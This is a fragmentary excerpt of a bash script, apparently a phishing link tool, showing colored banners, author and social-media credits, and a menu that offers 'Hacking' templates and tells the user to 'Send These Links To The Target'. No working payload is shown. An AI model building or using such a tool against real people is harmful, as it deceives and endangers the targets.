...
# Email      : mandisamotha11@gmail.com
# Credits    : Cold-Breazy, Codepen
# Date       : 17-07-2022
...
|| .|''|..'|''|...'.||. ||.'|...'.||. Breazy    
 ...
 \e[95;1m \e[0m\n"
    echo""                                        
  echo ""
   echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Follow Github : \e[36mhttps://github.com/cold-breazy\e[0m \e[1;32m\e[0m\e[1;33m]\e[0m'
   echo ""
...
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m Cold Breazy :\e[1;32m Follow my FB Page \e[1;33m @u'mandisa Motha'  !\e[0m"
sleep 4
echo ""
clear
...
replacer() {
    ...
    echo -e "${info}Send These Links To The Target : ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
    sleep 1
...
trap "echo -e '\n${success}Thanks for Using This Tool! Like Our Page : https://www.facebook.com/Mothalicious\n'; exit" 2
...
sleep 1
printf "${cyan}\nChoose ${nc}Option ${cyan}Hacking ${red}$=>${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
...
$red[Author]     ${cyan} :[Breazy, Junior, TeeViper]
$red[Github]     ${cyan} :[https://github.com/cold-breazy] 
$red[Whatsapp]    ${cyan} :[https://chat.whatsapp.com/GQ9Xx8XoTd34mKDFTTenzt]
$red[Facebook]   ${cyan} :[https://www.facebook.com/Mothalicious"
printf "${cyan}\nChoose ${nc}Option${cyan} =>${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://www.facebook.com/Mothalicious"
